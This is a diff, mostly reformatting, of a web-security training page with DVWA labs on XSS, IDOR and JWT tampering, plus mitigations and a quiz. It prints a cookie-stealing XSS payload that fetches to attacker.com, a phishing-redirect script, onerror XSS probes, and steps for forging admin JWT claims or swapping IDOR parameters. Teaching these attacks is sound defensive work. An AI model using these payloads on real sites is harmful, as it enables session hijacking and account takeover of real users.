+              If it pops an alert, it's vulnerable.</li>
+            <li>Use Burp Repeater to test variations, like <code
+                style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">&lt;img src="x" onerror="alert('XSS')"&gt;</code>
+              for event-based.</li>
             <li>Observe how the payload executes in the browser. Note that it's non-persistent.</li>
           </ol>
 
           <h3>Part B: Stored XSS</h3>
-          <p>Stored XSS is more dangerous as the payload is saved in the database and served to all users, enabling worm-like propagation.</p>
+          <p>Stored XSS is more dangerous as the payload is saved in the database and served to all users, enabling
+            worm-like propagation.</p>
           <ol>
             <li>Navigate to DVWA → <strong>XSS (Stored)</strong>.</li>
             <li>Post the payload in a feedback/comment field.</li>
             <li>Reload the page to see the payload trigger automatically for any viewer.</li>
-            <li>Understand the persistence and impact difference: Stored affects multiple users without interaction.</li>
+            <li>Understand the persistence and impact difference: Stored affects multiple users without interaction.
+            </li>
           </ol>
 
           <h3>Real-World Attack Scenarios</h3>
           <p>Attackers could use XSS to:</p>
           <ul>
-            <li>Steal session cookies: <code style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">&lt;script&gt;fetch('https://attacker.com/?c='+document.cookie)&lt;/script&gt;</code>. This leads to session hijacking.</li>
-            <li>Redirect users to phishing sites: <code style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">&lt;script&gt;window.location='fakebank.com';&lt;/script&gt;</code>.</li>
+            <li>Steal session cookies: <code
+                style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">&lt;script&gt;fetch('https://attacker.com/?c='+document.cookie)&lt;/script&gt;</code>.
+              This leads to session hijacking.</li>
+            <li>Redirect users to phishing sites: <code
+                style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">&lt;script&gt;window.location='fakebank.com';&lt;/script&gt;</code>.
+            </li>
             <li>Inject keyloggers: Capture keystrokes and send to attacker server.</li>
             <li>Deface web pages: Alter DOM to change content visually.</li>
           </ul>
 
           <div class="alert alert-warning">
-            <strong>Lab Safety:</strong> Use only harmless alert() payloads in the lab environment. Never exfiltrate actual data.
+            <strong>Lab Safety:</strong> Use only harmless alert() payloads in the lab environment. Never exfiltrate
+            actual data.
           </div>
 
           <h3>Mitigation Strategies</h3>
-          <p><strong>1. Output Encoding</strong>: Always encode user input when rendering to prevent interpretation as code.</p>
+          <p><strong>1. Output Encoding</strong>: Always encode user input when rendering to prevent interpretation as
+            code.</p>
           <pre>// PHP example
 echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
 
@@ -662,15 +808,21 @@ element.innerHTML = userInput;</pre>
       <section class="section" id="lab3">
         <div class="card">
           <h2>Lab 3 — Broken Access Control / IDOR (20 minutes)</h2>
-          
+
           <h3>Objective</h3>
-          <p>Identify Insecure Direct Object Reference (IDOR) vulnerabilities and understand proper authorization implementation. Broken access control allows users to access resources they shouldn't, often due to missing server-side checks, leading to data breaches.</p>
+          <p>Identify Insecure Direct Object Reference (IDOR) vulnerabilities and understand proper authorization
+            implementation. Broken access control allows users to access resources they shouldn't, often due to missing
+            server-side checks, leading to data breaches.</p>
 
           <h3>Exploitation Steps</h3>
           <ol>
             <li>Login as a low-privilege user on the lab application.</li>
-            <li>Inspect a resource URL like <code style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">/profile.php?user=2</code>.</li>
-            <li>Modify the parameter to <code style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">user=1</code> or other values using Burp or browser.</li>
+            <li>Inspect a resource URL like <code
+                style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">/profile.php?user=2</code>.
+            </li>
+            <li>Modify the parameter to <code
+                style="display:inline;padding:2px 6px;background:#0f1724;color:#f8fafc;border-radius:4px">user=1</code>
+              or other values using Burp or browser.</li>
             <li>Observe if you can access other users' data. If yes, it's IDOR.</li>
             <li>Try different resource types (files, API endpoints, etc.), e.g., incrementing invoice IDs.</li>
           </ol>
@@ -724,12 +876,14 @@ if (req.params.id !== req.user.id && !req.user.isAdmin) {
       <section class="section" id="lab4">
         <div class="card">
           <h2>Lab 4 — JWT Tampering (Optional, 30 minutes)</h2>
-          
+
           <h3>Objective</h3>
-          <p>Understand JSON Web Token structure, common misconfigurations, and proper implementation. JWTs are used for authentication, but weak implementations lead to tampering and privilege escalation.</p>
+          <p>Understand JSON Web Token structure, common misconfigurations, and proper implementation. JWTs are used for
+            authentication, but weak implementations lead to tampering and privilege escalation.</p>
 
           <h3>JWT Structure</h3>
-          <p>A JWT consists of three Base64-encoded parts separated by dots: header (algorithm, type), payload (claims like user, role), signature (verification).</p>
+          <p>A JWT consists of three Base64-encoded parts separated by dots: header (algorithm, type), payload (claims
+            like user, role), signature (verification).</p>
           <pre>header.payload.signature
 
 Example:
@@ -740,14 +894,16 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.sig
             <li>Capture a JWT from an API response or cookie using Burp.</li>
             <li>Decode header & payload using jwt.io or Burp Decoder. Inspect claims.</li>
             <li>Examine the claims (user, role, expiry, etc.).</li>
-            <li>If signature validation is weak, modify claims (e.g., change "role":"user" to "role":"admin"). Re-sign if key is known or none alg.</li>
+            <li>If signature validation is weak, modify claims (e.g., change "role":"user" to "role":"admin"). Re-sign
+              if key is known or none alg.</li>
             <li>Re-encode and test the modified token in requests.</li>
           </ol>
           <p>Common issue: Accepting 'alg': 'none' removes signature check.</p>
 
           <h3>Common Vulnerabilities</h3>
           <ul>
-            <li><strong>Algorithm Confusion:</strong> Changing "alg" from "RS256" to "none" or "HS256" with public key as secret.</li>
+            <li><strong>Algorithm Confusion:</strong> Changing "alg" from "RS256" to "none" or "HS256" with public key
+              as secret.</li>
             <li><strong>Weak Secrets:</strong> Brute-forcing HMAC keys if short or predictable.</li>
             <li><strong>Missing Signature Validation:</strong> Accepting unsigned tokens.</li>
             <li><strong>Key Confusion:</strong> Using public key as HMAC secret.</li>
@@ -800,7 +956,9 @@ decoded = jwt.decode(token, SECRET, algorithms=['HS256'])</pre>
       <section class="section" id="quiz">
         <div class="card">
           <h2>Sample Quiz (10 MCQs)</h2>
-          <p class="lead">This quiz assesses understanding of key concepts covered in the module. Answer all questions and submit to see your score. You must achieve at least 70% to pass; otherwise, you will need to retake the quiz.</p>
+          <p class="lead">This quiz assesses understanding of key concepts covered in the module. Answer all questions
+            and submit to see your score. You must achieve at least 70% to pass; otherwise, you will need to retake the
+            quiz.</p>
 
           <div class="quiz">
             <form id="quizForm">
@@ -842,7 +1000,8 @@ decoded = jwt.decode(token, SECRET, algorithms=['HS256'])</pre>
                   <strong>In a JWT, Base64 encoding is:</strong>
                   <div class="options">
                     <label><input type="radio" name="q4" value="A"> A. Secure encryption</label>
-                    <label><input type="radio" name="q4" value="B"> B. Plain text representation — not secure encryption</label>
+                    <label><input type="radio" name="q4" value="B"> B. Plain text representation — not secure
+                      encryption</label>
                     <label><input type="radio" name="q4" value="C"> C. Hashing algorithm</label>
                     <label><input type="radio" name="q4" value="D"> D. Compression method</label>
                   </div>
@@ -931,13 +1090,13 @@ decoded = jwt.decode(token, SECRET, algorithms=['HS256'])</pre>
 
   <script>
     // Compatibility check: ensure readable UI if CSS variables are not supported
-    (function(){
-      try{
-        if(!(window.CSS && CSS.supports && CSS.supports('color','var(--test)'))){
+    (function () {
+      try {
+        if (!(window.CSS && CSS.supports && CSS.supports('color', 'var(--test)'))) {
           document.body.style.background = '#fff';
           document.body.style.color = '#111';
         }
-      }catch(e){
+      } catch (e) {
         /* noop */
       }
     })();
@@ -982,7 +1141,7 @@ decoded = jwt.decode(token, SECRET, algorithms=['HS256'])</pre>
         if (activeNav) activeNav.classList.add('active');
         currentSectionIndex = sections.indexOf(sectionId);
         markCompleted();
-        window.scrollTo({top: 0, behavior: 'smooth'});
+        window.scrollTo({ top: 0, behavior: 'smooth' });
         if (window.innerWidth <= 968) {
           document.getElementById('sidebar').classList.remove('open');
           document.querySelector('.menu-toggle').style.display = 'block';
@@ -1075,10 +1234,10 @@ decoded = jwt.decode(token, SECRET, algorithms=['HS256'])</pre>
     document.addEventListener('click', (e) => {
       const sidebar = document.getElementById('sidebar');
       const menuToggle = document.querySelector('.menu-toggle');
-      if (window.innerWidth <= 968 && 
-          sidebar.classList.contains('open') && 
-          !sidebar.contains(e.target) && 
-          !menuToggle.contains(e.target)) {
+      if (window.innerWidth <= 968 &&
+        sidebar.classList.contains('open') &&
+        !sidebar.contains(e.target) &&
+        !menuToggle.contains(e.target)) {
         toggleSidebar();
       }
     });
@@ -1088,4 +1247,5 @@ decoded = jwt.decode(token, SECRET, algorithms=['HS256'])</pre>
     markCompleted();
   </script>
 </body>
+
 </html>
